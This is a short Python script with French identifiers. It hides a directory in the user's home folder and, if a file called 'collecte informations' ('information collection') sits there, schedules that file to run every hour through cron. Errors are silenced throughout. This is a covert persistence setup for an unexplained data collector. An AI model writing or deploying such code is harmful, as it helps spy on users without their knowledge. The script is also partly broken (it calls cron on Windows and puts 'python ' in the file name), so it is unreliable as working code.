import os,sys,psutil
from pyquickhelper.loghelper import run_cmd
from crontab import CronTab

chemin = os.path.expanduser('~')
chemin = os.path.join(chemin , '.codeexeauto')
try:
    os.mkdir(chemin) 
except:
    print("")

try:
    
    if sys.platform.startswith("win"):
        cmd = "ATTRIB " + chemin + " +h"
        out, err = run_cmd(cmd, wait=True)
except:
    print(" ")



nom_fichier = "python collecte informations.py"



try:
    open(os.path.join(chemin,nom_fichier) , "r")
    flag = True
except:
    flag = False

tt = psutil.users()
nom_utilisateur = tt[0][0]

if flag :
    if psutil.WINDOWS :
        cron  = CronTab(user = nom_utilisateur)
        cron = CronTab(tab=""" */1 * * * * python """ + os.path.join(chemin,nom_fichier))
        job = cron.new(command='python ' + os.path.join(chemin,nom_fichier))
        job.hour.every(1)
        cron.write()
    else:
        cron  = CronTab(user = nom_utilisateur)
        job = cron.new(command='python ' + os.path.join(chemin,nom_fichier))
        job.hour.every(1)
        cron.write()
        
        
        
else:
    print("vide")
    


